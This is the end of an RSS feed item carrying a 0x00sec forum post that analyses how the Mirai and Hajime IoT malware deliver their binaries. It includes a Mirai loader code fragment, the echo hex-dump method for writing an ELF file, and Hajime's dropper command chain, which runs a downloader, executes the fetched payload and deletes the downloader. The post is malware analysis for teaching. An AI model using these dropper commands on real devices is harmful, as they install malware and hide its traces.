<li class="selected">                    case TELNET_UPLOAD_METHODS:</li>
<li>                        consumed = connection_consume_upload_methods(conn);</li>
<li>
</li><li>                        if (consumed)</li>
<li>                        {</li>
<li>#ifdef DEBUG</li>
<li>                            printf("[FD%d] Upload method is ", conn-&gt;fd);</li>
<li>#endif</li>
<li>                            switch (conn-&gt;info.upload_method)</li>
<li>                            {</li>
<li>                                case UPLOAD_ECHO:</li>
</ol></code></pre>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>When one of those tools are available, then we are done, but sometimes none of them can be found, and techniques like the <code>echo</code> method used by Mirai are needed.</p>
<h2>Transferring files the hard way</h2>
<p>So, how does this <code>echo</code> method works. Well this is simpler that it may look like. It just <code>echoes</code> a hex string to a file. Something like this:</p>
<pre><code class="lang-auto">echo -ne "\x7f\x45\x4c\x46\x..." &gt; malware
</code></pre>
<p>This, however only works with very small binaries. For bigger binaries you may have to split the <code>echo</code> command in many pieces and use the <code>&gt;&gt;</code> append redirection to append each piece to the result file.</p>
<h2>The Hajime case</h2>
<p>The Hajime case is very interesting as it does a kind of two stages dropping <a href="https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf" rel="nofollow noopener">check this</a> for details.</p>
<p>It first deploys a very small ELF binary. This binary is the one that will download the real malware. It connects to a pre-defined server and outputs to <code>stdout</code> whatever it receives from the server… the real malware. The way it does this is interesting. After dumping the first binary (the small one) using the <code>echo</code> technique, it runs the following shell commands:</p>
<pre><code class="lang-auto">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI
</code></pre>
<p>So <code>.s</code> is the file where the small ELF was dumped using <code>echo</code>. This file was created previously and it has already got execution permissions. Knowing this, the shell code above does the following:</p>
<ul>
<li>
<code>cp .s .i</code> copies the small ELF (the one that will download the real malware) stored in <code>.s</code> to <code>.i</code>. As you know, all files starting with a dot are hidden (you have to use the flag <code>-a</code> with <code>ls</code> to see them). So this makes a copy of the binary… <strong>preserving the permissions</strong>. This basically means that we do not have to do <code>chmod 777 .i</code> after downloading the final malware</li>
<li>
<code>&gt;.i </code>. This is actually truncating the file. In other words, this is a way to remove all the content of the file and set its size to 0… but <strong>keeping the file permissions</strong>. So right now, we have an empty file with execution permissions</li>
<li>
<code>./.s&gt;.i</code> this is more obvious. Now it runs the downloader (the small ELF file created with <code>echo</code>) and redirects its standard output to the <strong>empty but executable</strong> file <code>.i</code>. As we said above, this downloader connects to a server and dumps to <code>stdout</code> whatever the server sends back. Think about it as a minimal <code>wget</code> command.</li>
<li>
<code>./.i;rm .s</code> and finally the just downloaded malware is executed and the downloader removed from the disk. The main malware is likely a daemon, so, once started (<code>./.i</code>), it just returns the control to the shell that can then delete the downloader.</li>
</ul>
<p>And from this point on that device is compromised.</p>
<h1>Conclusions</h1>
<p>Well, this is it for today. Hope you enjoy the reading and if this was a new topic for you that you have learn something. Please be free to share your comments and ask your questions in the comments below.</p>
<h3>Resources</h3>
<p>The contents of this paper is based on the information provided by the following sources:</p>
<p>Mirai Source Code: <a href="https://github.com/jgamblin/Mirai-Source-Code/tree/master/loader/src" rel="nofollow noopener">https://github.com/jgamblin/Mirai-Source-Code/tree/master/loader/src</a><br>
Hajime Analysis: <a href="https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf" rel="nofollow noopener">https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf</a></p>
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/1</link>
        <pubDate>Thu, 04 May 2017 17:03:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-1</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
  </channel>
</rss>
